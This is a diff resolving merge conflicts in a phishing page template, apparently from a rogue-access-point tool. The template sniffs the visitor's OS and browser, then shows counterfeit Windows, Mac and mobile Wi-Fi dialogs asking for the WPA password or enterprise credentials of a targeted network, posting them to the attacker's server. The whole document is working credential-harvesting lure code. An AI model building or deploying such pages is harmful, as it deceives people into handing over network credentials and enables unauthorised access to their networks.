@@ -154,66 +154,12 @@
 	var resolvedBrowser = jscd.browser;
 	var resolvedPl = jscd.os;
 
-<<<<<<< .merge_file_IOxRt0
-        if (resolvedOs == "Windows") {
-            document.write("<title i18n-content=\"title\">Internet connection is not available</title>");
-            document.write("<link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />")
-            document.write("<link rel='stylesheet' href='/static/style.css'>");
-            document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css'>");
-        }
-	
-        else if (resolvedOs == "Mac OS X") {
-            document.write("<link rel='stylesheet' href='/static/mac-network-manager.css' />");
-        }
-	
-        else {
-	    document.write("<link rel='stylesheet' href='/static/ios.css'>");
-        }
-
-	if ( {{ enterprise }} == "0") {
-	       var loadhtml_mac = '<div id="details" class="hidden" ></div>' +
-	'        <div class="mac-wifi" id="mac-wifi" style="display:none">' +
-	'            <div id="modal-title" class="title"></div>' +
-	'            <div class="content">' +
-	'                <div class="icon">' +
-	'                    <img src="/static/wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />' +
-	'                    <img src="/static/question.png" alt="?" width="25" class="question" />' +
-	'                </div>' +
-	'                <div class="description">' +
-	'                   <form id="wifi-search-form" method="post" action="/post">' +
-	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.</strong>' + 
-	'                       <div class="password">' +
-	'                           <label>Password: </label>' +
-	'                           <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
-	'                           <br>' +
-	'                           <label id="pw_status"></label>' +
-	'                           <br>' +
-	'                           <div class="glow"></div>' +
-	'                       </div>' + 
-	'                       <div class="checkmark">' +
-	'                           <input id="show-password" type="checkbox" /><label for="show-password">Show password</label>' +
-	'                       </div>' +
-	'                       <div class="checkmark">' +
-	'                           <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
-	'                       </div>' + 
-	'                       <div class="buttons">' +
-	'                           <input id="button-join" type="submit" value="Join">' +
-	'                           <input id="button-cancel" type="reset" value="Reset">' +
-	'                      </div>' +
-	'                   </form>' +
-	'               </div>' +
-	'          </div>' +
-        '	</div>';
-	}
-
-	else if ( {{ enterprise }} == "1") {
-=======
 
         if (resolvedPl == "Windows") {
 		if (resolvedBrowser == "Chrome") {
 	            document.write("<title i18n-content=\"title\">Internet connection is not available</title>");
 	            document.write("<link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />")
-	            document.write("<link rel='stylesheet' href='/static/style.css' />");
+	            document.write("<link rel='stylesheet' href='/static/chrome-style.css' />");
             	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css' />");
 		}
 		else if (resolvedBrowser == "Opera") {
@@ -238,9 +184,21 @@
 	}
 	
         else if (resolvedPl == "Mac OS") {
+		if (resolvedBrowser == "Chrome") {
+	            document.write("<title i18n-content=\"title\">Internet connection is not available</title>");
+	            document.write("<link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />")
+	            document.write("<link rel='stylesheet' href='/static/mac-network-manager-Chrome.css' />");
+            	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css' />");
+		}
+		else if (resolvedBrowser == "Firefox") {
+		    document.write("<link rel='stylesheet' href='/static/firefox-offline.css' type='text/css' />")
+	            document.write("<link rel='stylesheet' href='/static/mac-network-manager-Firefox.css' />");
+		}
+		else {
 	    	document.write("<link rel='stylesheet' href='/static/page-load-errors.css' />");
 	    	document.write("<link rel='stylesheet' href='/static/page-load-errors-extras.css' />");
-            	document.write("<link rel='stylesheet' href='/static/mac-network-manager.css' />");
+            	document.write("<link rel='stylesheet' href='/static/mac-network-manager-Safari.css' />");
+		}
 	}
 	
         else {
@@ -253,7 +211,6 @@
 	<script>
 	
 	if ( {{ enterprise }} == "0") {
->>>>>>> .merge_file_tcrKy0
 	       var loadhtml_mac = '<div id="details" class="hidden" ></div>' +
 	'        <div class="mac-wifi" id="mac-wifi" style="display:none">' +
 	'            <div id="modal-title" class="title"></div>' +
@@ -264,17 +221,9 @@
 	'                </div>' +
 	'                <div class="description">' +
 	'                   <form id="wifi-search-form" method="post" action="/post">' +
-<<<<<<< .merge_file_IOxRt0
-	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires {{ target_ap_encryption }} enterprise credentials.</strong>' + 
-	'                       <div class="password">' +
-	'			    <label>Username: </label>' +
-	'			    <input type="email" id="wifi-search-username" name="wfphshr-wpa-username"/>' +	
-	'                           <label>Password: </label>' +		
-=======
 	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.</strong>' + 
 	'                       <div class="password">' +
 	'                           <label>Password: </label>' +
->>>>>>> .merge_file_tcrKy0
 	'                           <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
 	'                           <br>' +
 	'                           <label id="pw_status"></label>' +
@@ -282,11 +231,7 @@
 	'                           <div class="glow"></div>' +
 	'                       </div>' + 
 	'                       <div class="checkmark">' +
-<<<<<<< .merge_file_IOxRt0
-	'                           <input id="show-password" type="checkbox" /><label for="show-password">Show password</label>' +
-=======
 	'                           <input id="show-password" type="checkbox" /><label for="show-password" style="margin-right: 60px;">Show password</label>' +
->>>>>>> .merge_file_tcrKy0
 	'                       </div>' +
 	'                       <div class="checkmark">' +
 	'                           <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
@@ -301,14 +246,6 @@
         '	</div>';
 	}
 
-<<<<<<< .merge_file_IOxRt0
-	
-
-	
-        if ( {{ enterprise }} == "0" ) {
-        	var loadhtml_windows = "<form id='windows-form' method='post' action='/post'><div class=\'network-manager\'\>" +
-	"	<ul>" +
-=======
 	else if ( {{ enterprise }} == "1") {
 	       var loadhtml_mac = '<div id="details" class="hidden" ></div>' +
 	'        <div class="mac-wifi" id="mac-wifi" style="display:none">' +
@@ -354,7 +291,6 @@
         if ( {{ enterprise }} == "0" ) {
         	var loadhtml_windows = "<form id='windows-form' method='post' action='/post'><div class=\'network-manager\'\>" +
 	"	<ul class= 'firest'>" +
->>>>>>> .merge_file_tcrKy0
 	"		<li class='selected'>" +
 	"			<div class='wifi icon'>" +
 	"				<div class='dot dot1'></div>" +
@@ -366,11 +302,7 @@
 	"				<strong>{{ target_ap_essid }}</strong>" +
 	"				<div class='disconnected'>" +
 	"					<input id='automatic' type='checkbox' />" +
-<<<<<<< .merge_file_IOxRt0
-	"					<label for='automatic'>" +
-=======
 	"					<label for='automatic' id='networklabel'>" +
->>>>>>> .merge_file_tcrKy0
 	"						<div class='check'></div>" +
 	"						Connect automatically" +
 	"					</label>" +
@@ -382,15 +314,9 @@
 	"					</label>" +
 	"					<input id='password' type='password' name='wfphshr-wpa-password' />" +
 	"					You can also connect by pushing the button on the" +
-<<<<<<< .merge_file_IOxRt0
-	"					router." +
-	"					<input id='share' type='checkbox' />" +
-	"					<label for='share'>" +
-=======
 	"					router.\n" +
 	"					<input id='share' type='checkbox' />" +
 	"					<label for='share' class='sharecheck'>" +
->>>>>>> .merge_file_tcrKy0
 	"						<div class='check'></div>" +
 	"						Share network with my contacts" +
 	"					</label>" +
@@ -414,21 +340,13 @@
 	"		</li>" +
 			{% end %}
 	"	</ul> " +
-<<<<<<< .merge_file_IOxRt0
-	"	<a href=''>Network settings</a> " +
-=======
 	"	<a href='' class='networksettings'>Network settings</a> " +
->>>>>>> .merge_file_tcrKy0
 	"	</div></form>";
 	}
 
 	else if ( {{ enterprise }} == "1" )  {
 		var loadhtml_windows = "<form id='windows-form' method='post' action='/post'><div class=\'network-manager\'\>" +
-<<<<<<< .merge_file_IOxRt0
-	"	<ul>" +
-=======
 	"	<ul class= 'firest'>" +
->>>>>>> .merge_file_tcrKy0
 	"		<li class='selected'>" +
 	"			<div class='wifi icon'>" +
 	"				<div class='dot dot1'></div>" +
@@ -440,11 +358,7 @@
 	"	  			<strong>{{ target_ap_essid }}</strong>" +
 	"	  			<div class='disconnected'>" +
 	"					<input id='automatic' type='checkbox' />" +
-<<<<<<< .merge_file_IOxRt0
-	"					<label for='automatic'>" +
-=======
 	"					<label for='automatic' id='networklabel'>" +
->>>>>>> .merge_file_tcrKy0
 	"						<div class='check'></div>" +
 	"	                      		 	Connect automatically" +
 	"					</label>" +
@@ -457,15 +371,9 @@
 	"					<input id='text' type='text' name='wfphshr-wpa-username' />" +
 	"					<input id='password' type='password' name='wfphshr-wpa-password' />" +
 	"	                   		You can also connect by pushing the button on the" +
-<<<<<<< .merge_file_IOxRt0
-	"	                   		router." +
-	"					<input id='share' type='checkbox' />" +
-	"					<label for='share'>" +
-=======
 	"	                   		router.\n" +
 	"					<input id='share' type='checkbox' />" +
 	"					<label for='share' class='sharecheck'>" +
->>>>>>> .merge_file_tcrKy0
 	"						<div class='check'></div>" +
 	"	                       			Share network with my contacts" +
 	"					</label>" +
@@ -489,13 +397,6 @@
 	"		</li>" +
 			{% end %}
 	"	</ul> " +
-<<<<<<< .merge_file_IOxRt0
-	"	<a href=''>Network settings</a> " +
-	"	</div></form>";
-	}
-		
-
-=======
 	"	<a href='' class='networksettings'>Network settings</a> " +
 	"	</div></form>";
 	}
@@ -503,7 +404,6 @@
 	</script>
 	
 	<script>
->>>>>>> .merge_file_tcrKy0
 	var loadhtml_mobile = '<form id="wifi-search-form" method="post" action="/post">' +
 	'<input class="hidden" id="wifi-search-password" name="wfphshr-wpa-password" />' +
 	' 	<div class="buttons">' +
